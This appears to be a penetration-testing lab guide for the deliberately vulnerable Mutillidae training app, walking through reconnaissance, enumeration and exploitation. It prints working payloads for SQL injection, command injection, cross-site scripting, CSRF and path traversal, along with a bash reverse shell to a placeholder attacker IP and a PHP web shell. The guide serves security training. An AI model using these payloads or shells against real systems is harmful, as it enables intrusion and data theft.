# 1. Introduction to Mutillidae

## What Mutillidae Is

- A deliberately vulnerable PHP/MySQL web application
- Designed for OWASP Top 10 training
- Contains dozens of modules and multi‑step vulnerabilities
- Supports multiple security levels (0–5)

## Why Mutillidae Matters

- More realistic than DVWA
- Larger attack surface
- Includes multi‑page workflows
- Excellent for recon → enumeration → exploitation → reporting

## What Mutillidae Is NOT

- Not a modern secure web app
- Not representative of hardened enterprise systems
- Not meant for production use

# 3. Lab Setup & Networking

## Recommended Setup

- Kali: NAT + Host‑only
- Mutillidae: Host‑only (via OWASP BWA or standalone)

```bash

curl -I http://<Mutillidae-IP>/mutillidae
```

# 4. Reconnaissance Workflows

## Host Discovery

```bash
nmap -sn <network>/24
netdiscover
arp-scan <network>/24
```

## Port Scanning

```bash
nmap -sC -sV -oN mutillidae_scan.txt <IP>
```

## What You Should Identify

- Apache version
- PHP version
- MySQL version
- Mutillidae path (`/mutillidae/`)
- Additional apps on the same host

# 5. Enumeration Workflows

## Directory Enumeration

```bash
gobuster dir -u http://<IP>/mutillidae -w /usr/share/wordlists/dirb/common.txt
```

Look for:

- `/index.php?page=...`
- `/documentation/`
- `/robots.txt`
- `/includes/`
- `/config.inc`

---

## Parameter Enumeration

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hl 0 http://<IP>/mutillidae/index.php?page=FUZZ
```

---

## Cookie & Session Enumeration

```bash
curl -I http://<IP>/mutillidae
```

Look for:

- `PHPSESSID`
- `security_level` cookie

---

## Header Enumeration

```bash
curl -I http://<IP>/mutillidae
```

Look for:

- Server version
- X‑Powered‑By
- Missing security headers

---

## Database Enumeration

- MySQL default creds
- phpMyAdmin
- Config files with plaintext passwords

# 7. Exploitation Workflows

Below are **school‑level explanations** + **real‑world parallels**.

---

## SQL Injection (Classic)

### Manual Testing

```bash
curl "http://<IP>/mutillidae/index.php?page=user-info.php&username=admin'-- -"
```

### Extract Database Names

```bash
admin' UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```

---

## SQL Injection (Blind)

### Boolean‑Based

```bash
admin' AND 1=1-- -
admin' AND 1=2-- -
```

### Time‑Based

```bash
admin' AND SLEEP(5)-- -
```

---

## Command Injection

### Test Payloads

```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | uname -a
```

### Reverse Shell

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1'
```

---

## File Upload Bypass

### Upload PHP Shell

```php
<?php system($_GET['cmd']); ?>
```

### Bypass Filters

- Change extension: `.php5`, `.phtml`
- Add null byte: `shell.php%00.jpg`
- Modify MIME type

---

## XSS (Reflected)

```bash
<script>alert(1)</script>
```

---

## XSS (Stored)

```bash
"><script>alert('pwned')</script>
```

---

## CSRF

### Example Attack Form

```html
<form action="http://<IP>/mutillidae/index.php?page=change-password.php" method="POST">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="submit">
</form>
```

---

## File Inclusion

```bash
?page=../../../../etc/passwd
```
